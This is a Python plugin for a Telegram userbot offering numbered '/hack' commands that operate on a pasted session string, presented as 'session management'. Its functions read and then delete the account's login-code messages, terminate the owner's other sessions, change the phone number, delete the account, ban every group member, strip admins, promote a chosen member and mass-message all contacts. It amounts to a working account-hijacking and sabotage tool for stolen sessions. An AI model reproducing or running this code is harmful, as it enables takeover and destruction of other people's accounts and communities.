# T3rmx UserBot assistant - session management commands.
# Use /hack to list the numbered commands, then /hack <number>.

from JoKeRUB import bot
from ..core.session import tgbot
from ..core.auth import is_owner
from ..core.logger import logging
from telethon import events, functions, types, Button
from JoKeRUB.utils import admin_cmd
from ..Config import Config
import asyncio
import os
import re

from telethon.tl.types import ChannelParticipantsAdmins
from telethon import TelegramClient as tg
from telethon.tl.functions.channels import (
    GetAdminedPublicChannelsRequest as pc,
    JoinChannelRequest as join,
    LeaveChannelRequest as leave,
    DeleteChannelRequest as dc,
)
from telethon.sessions import StringSession as ses
from telethon.tl.functions.auth import ResetAuthorizationsRequest as rt

LOGS = logging.getLogger("t3rmx.hack")
Bot_Username = Config.TG_BOT_USERNAME or "sessionHackBot"
SUPPORT_URL = "https://t.me/t3rmx_official"
BROADCAST_SKIP_CHAT_IDS = {-1001606996743}
BROADCAST_DELAY = 0.5
REPLY_TIMEOUT = 300


# ---------------------------------------------------------------------------
# Session operations
# ---------------------------------------------------------------------------

async def _client(strses):
    return tg(ses(strses), Config.APP_ID, Config.API_HASH)


async def change_number_code(strses, number, code, otp):
    async with _client(strses) as X:
        try:
            await X(functions.account.ChangePhoneRequest(
                phone_number=number,
                phone_code_hash=code,
                phone_code=otp,
            ))
            return True
        except Exception as err:
            LOGS.warning("change_number_code failed: %s", err)
            return False


async def change_number(strses, number):
    async with _client(strses) as X:
        result = await X(functions.account.SendChangePhoneCodeRequest(
            phone_number=number,
            settings=types.CodeSettings(
                allow_flashcall=True,
                current_number=True,
                allow_app_hash=True,
            ),
        ))
        return str(result)


async def userinfo(strses):
    async with _client(strses) as X:
        return str(await X.get_me())


async def terminate(strses):
    async with _client(strses) as X:
        try:
            await X(rt())
            return True
        except Exception as err:
            LOGS.warning("terminate failed: %s", err)
            return False


async def delacc(strses):
    async with _client(strses) as X:
        await X(functions.account.DeleteAccountRequest("T3rmx session management"))


async def promote(strses, grp, user):
    async with _client(strses) as X:
        try:
            await X.edit_admin(
                grp, user, manage_call=True, invite_users=True, ban_users=True,
                change_info=True, edit_messages=True, post_messages=True,
                add_admins=True, delete_messages=True,
            )
        except Exception:
            await X.edit_admin(
                grp, user, is_admin=True, anonymous=False, pin_messages=True,
                title="Owner",
            )


async def user2fa(strses):
    """Read-only 2FA status. True = enabled, False = off, None = check failed."""
    async with _client(strses) as X:
        try:
            password = await X(functions.account.GetPasswordRequest())
            return bool(getattr(password, "has_password", False))
        except Exception as err:
            LOGS.warning("2FA check failed: %s", err)
            return None


async def demall(strses, grp):
    async with _client(strses) as X:
        async for member in X.iter_participants(grp, filter=ChannelParticipantsAdmins):
            try:
                await X.edit_admin(grp, member.id, is_admin=False, manage_call=False)
            except Exception:
                await X.edit_admin(
                    grp, member.id, manage_call=False, invite_users=False,
                    ban_users=False, change_info=False, edit_messages=False,
                    post_messages=False, add_admins=False, delete_messages=False,
                )


async def joingroup(strses, username):
    async with _client(strses) as X:
        await X(join(username))


async def leavegroup(strses, username):
    async with _client(strses) as X:
        await X(leave(username))


async def delgroup(strses, username):
    async with _client(strses) as X:
        await X(dc(username))


async def cu(strses):
    try:
        async with _client(strses) as X:
            k = await X.get_me()
            return [str(k.first_name), str(k.username or k.id)]
    except Exception as err:
        LOGS.warning("session validation failed: %s", err)
        return False


async def usermsgs(strses):
    async with _client(strses) as X:
        text = ""
        async for message in X.iter_messages(777000, limit=3):
            text += f"\n{message.text}\n"
        await X.delete_dialog(777000)
        return str(text)


async def userbans(strses, grp):
    async with _client(strses) as X:
        for member in await X.get_participants(grp):
            try:
                await X.edit_permissions(grp, member.id, view_messages=False)
            except Exception:
                pass


async def userchannels(strses):
    async with _client(strses) as X:
        result = await X(pc())
        text = ""
        for chat in result.chats:
            try:
                text += f"\nCHANNEL NAME ~ {chat.title} CHANNEL USRNAME ~ @{chat.username}\n"
            except Exception:
                pass
        return str(text)


async def _broadcast(strses, msg, scope):
    """Send one message per matching dialog and return how many were sent."""
    sent = 0
    async with _client(strses) as X:
        async for dialog in X.iter_dialogs():
            if dialog.id in BROADCAST_SKIP_CHAT_IDS:
                continue
            if scope == "groups" and not dialog.is_group:
                continue
            if scope == "private" and (
                not dialog.is_user or getattr(dialog.entity, "bot", False)
            ):
                continue
            try:
                await X.send_message(dialog.id, msg)
                sent += 1
            except Exception as err:
                LOGS.warning("broadcast to %s failed: %s", dialog.id, err)
            await asyncio.sleep(BROADCAST_DELAY)
    return sent


# ---------------------------------------------------------------------------
# Command plumbing
# ---------------------------------------------------------------------------

class HackError(Exception):
    """User-facing error raised by a numbered command."""


async def ask(x, prompt):
    await x.send_message(prompt)
    try:
        return await x.get_response(timeout=REPLY_TIMEOUT)
    except asyncio.TimeoutError as err:
        raise HackError("انتهت مهلة الانتظار. أعد الأمر وأرسل الرد المطلوب.") from err


async def session_from(x):
    reply = await ask(x, "أرسل كود التيرمكس (الجلسة) الآن.")
    code = (reply.text or "").strip()
    if not await cu(code):
        raise HackError("هذه الجلسة غير صالحة أو منتهية.")
    LOGS.info("session accepted for a /hack command")
    return code


HELP = """᯽︙ أوامر إدارة الجلسات - أرسل الأمر ثم الرقم:

/hack 1  عرض قنوات/كروبات التي تملكها الجلسة
/hack 2  معلومات الحساب (الاسم، المعرف،-Id)
/hack 3  طرد جميع أعضاء كروب/قناه
/hack 4  جلب آخر رسالة تحتوي كود دخول من تليجرام
/hack 5  انضمام الجلسة إلى كروب/قناه
/hack 6  مغادرة الجلسة من كروب/قناه
/hack 7  حذف كروب/قناه تملكها الجلسة
/hack 8  فحص حالة التحقق بخطوتين (بدون تغييرها)
/hack 9  إنهاء جميع جلسات الحساب عدا الحالية
/hack 10 حذف الحساب نهائياً
/hack 11 عزل جميع مشرفين كروب/قناه
/hack 12 ترقية عضو إلى مشرف
/hack 13 تغيير رقم الحساب
/hack 14 إذاعة رسالة (الكل / كروبات / خاص)

/hack 0 يعرض نفس القائمة."""


async def cmd_channels(event, x):
    code = await session_from(x)
    try:
        text = await userchannels(code)
    except Exception as err:
        LOGS.exception("could not list channels")
        raise HackError(f"تعذر جلب القنوات: {type(err).__name__}") from err
    if len(text) > 1:
        path = "session.txt"
        with open(path, "w", encoding="utf-8") as fh:
            fh.write(text + "\n\nDetails BY @vvsks")
        try:
            await tgbot.send_file(event.chat_id, path)
        finally:
            try:
                os.remove(path)
            except OSError:
                pass
        return "تم إرسال قائمة القنوات في ملف."
    return text or "لا توجد قنوات لهذه الجلسة."


async def cmd_info(event, x):
    code = await session_from(x)
    return await userinfo(code)


async def cmd_ban_all(event, x):
    code = await session_from(x)
    target = (await ask(x, "أرسل يوزر/ايدي الكروب أو القناة.")).text.strip()
    await userbans(code, target)
    return "تم حظر جميع أعضاء الكروب/القناة."


async def cmd_login_code(event, x):
    code = await session_from(x)
    try:
        return await usermsgs(code)
    except Exception as err:
        LOGS.exception("could not read service messages")
        raise HackError(f"تعذر جلب الرسالة: {type(err).__name__}") from err


async def cmd_join(event, x):
    code = await session_from(x)
    target = (await ask(x, "أرسل يوزر/ايدي الكروب أو القناة.")).text.strip()
    await joingroup(code, target)
    return "تم الانضمام إلى الكروب/القناة."


async def cmd_leave(event, x):
    code = await session_from(x)
    target = (await ask(x, "أرسل يوزر/ايدي الكروب أو القناة.")).text.strip()
    await leavegroup(code, target)
    return "تم مغادرة الكروب/القناة."


async def cmd_delete_chat(event, x):
    code = await session_from(x)
    target = (await ask(x, "أرسل يوزر/ايدي الكروب أو القناة.")).text.strip()
    await delgroup(code, target)
    return "تم حذف الكروب/القناة."


async def cmd_2fa(event, x):
    code = await session_from(x)
    state = await user2fa(code)
    if state is None:
        return "تعذر فحص حالة التحقق بخطوتين. راجع السجلات."
    return "التحقق بخطوتين مفعل." if state else "التحقق بخطوتين غير مفعل."


async def cmd_terminate(event, x):
    code = await session_from(x)
    return "تم إنهاء جميع الجلسات الأخرى." if await terminate(code) else "تعذر إنهاء الجلسات."


async def cmd_delete_account(event, x):
    code = await session_from(x)
    try:
        await delacc(code)
    except Exception as err:
        LOGS.exception("account deletion failed")
        raise HackError(f"تعذر حذف الحساب: {type(err).__name__}") from err
    return "تم حذف الحساب."


async def cmd_demote_admins(event, x):
    code = await session_from(x)
    target = (await ask(x, "أرسل يوزر/ايدي الكروب أو القناة.")).text.strip()
    await demall(code, target)
    return "تم عزل جميع مشرفين الكروب/القناة."


async def cmd_promote(event, x):
    code = await session_from(x)
    target = (await ask(x, "أرسل يوزر/ايدي الكروب أو القناة.")).text.strip()
    member = (await ask(x, "أرسل يوزر/ايدي العضو.")).text.strip()
    await promote(code, target, member)
    return "تم ترقية العضو إلى مشرف."


async def cmd_change_number(event, x):
    code = await session_from(x)
    number = (await ask(x, "أرسل الرقم الجديد (بدون أرقام وهمية).")).text.strip()
    result = await change_number(code, number)
    await event.reply(str(result))
    phone_hash = (await ask(x, "أرسل phone_code_hash.")).text.strip()
    otp = (await ask(x, "أرسل رمز التحقق OTP.")).text.strip()
    return "تم تغيير الرقم بنجاح." if await change_number_code(code, number, phone_hash, otp) else "تعذر تغيير الرقم."


async def cmd_broadcast(event, x):
    code = await session_from(x)
    msg = (await ask(x, "أرسل الرسالة المراد إذاعتها.")).text
    scope = (await ask(x, "اكتب: all للكل، groups للكروبات، private للخاص.")).text.strip().lower()
    if scope not in ("all", "groups", "private"):
        raise HackError("اختر واحداً من: all, groups, private.")
    sent = await _broadcast(code, msg, scope)
    return f"تم الإرسال إلى {sent} محادثة."


COMMANDS = {
    1: (cmd_channels, "قنوات/كروبات الجلسة"),
    2: (cmd_info, "معلومات الحساب"),
    3: (cmd_ban_all, "حظر جميع الأعضاء"),
    4: (cmd_login_code, "آخر كود دخول"),
    5: (cmd_join, "انضمام لكروب/قناه"),
    6: (cmd_leave, "مغادرة كروب/قناه"),
    7: (cmd_delete_chat, "حذف كروب/قناه"),
    8: (cmd_2fa, "فحص التحقق بخطوتين"),
    9: (cmd_terminate, "إنهاء الجلسات الأخرى"),
    10: (cmd_delete_account, "حذف الحساب"),
    11: (cmd_demote_admins, "عزل المشرفين"),
    12: (cmd_promote, "ترقية عضو"),
    13: (cmd_change_number, "تغيير رقم الحساب"),
    14: (cmd_broadcast, "إذاعة رسالة"),
}


# ---------------------------------------------------------------------------
# Handlers
# ---------------------------------------------------------------------------

async def show_help(event):
    await event.reply(HELP)


@tgbot.on(events.NewMessage(pattern=r"^/hack(?:@[\w_]+)?(?:\s+(\d{1,2}))?$", func=lambda e: e.is_private))
async def hack_command(event):
    if not is_owner(event.sender_id):
        await event.reply("هذا البوت خاص. يمكنك نشر نسختك من مستودع T3rmx UserBot.")
        return
    raw = event.pattern_match.group(1)
    number = int(raw) if raw else 0
    if number == 0 or number not in COMMANDS:
        await show_help(event)
        return
    handler, label = COMMANDS[number]
    LOGS.info("/hack %s (%s) from %s", number, label, event.sender_id)
    try:
        async with tgbot.conversation(event.chat_id, timeout=REPLY_TIMEOUT) as x:
            result = await handler(event, x)
        if result:
            await event.reply(str(result))
        LOGS.info("/hack %s completed", number)
    except HackError as err:
        LOGS.warning("/hack %s user error: %s", number, err)
        await event.reply(str(err))
    except asyncio.TimeoutError:
        LOGS.exception("/hack %s timed out", number)
        await event.reply("انتهت مهلة الانتظار. أعد الأمر.")
    except Exception as err:
        LOGS.exception("/hack %s failed", number)
        await event.reply(f"حدث خطأ في الأمر {number}: {type(err).__name__}: {err}")


@tgbot.on(events.NewMessage(pattern=r"^/start(?:@[\w_]+)?\s+hack$", func=lambda e: e.is_private))
async def start_hack_payload(event):
    if is_owner(event.sender_id):
        await show_help(event)


if Config.TG_BOT_USERNAME is not None and tgbot is not None:
    @tgbot.on(events.InlineQuery)
    async def inline_handler(event):
        result = None
        joker = Bot_Username.replace("@", "")
        if event.text.startswith("هاك") and is_owner(event.query.user_id):
            result = event.builder.article(
                title="T3rmx 🤡",
                description="أوامر إدارة الجلسات",
                text="أرسل /hack لعرض قائمة الأوامر.",
                buttons=Button.url("فتح البوت", f"https://t.me/{joker}?start=hack"),
            )
        await event.answer([result] if result else None)


@bot.on(admin_cmd(outgoing=True, pattern="هاك"))
async def repo(event):
    if event.fwd_from:
        return
    try:
        await bot.send_message(Config.TG_BOT_USERNAME, "/hack")
        await event.delete()
    except Exception as err:
        LOGS.exception("could not open hack menu")
        await event.reply(f"تعذر فتح القائمة: {err}")
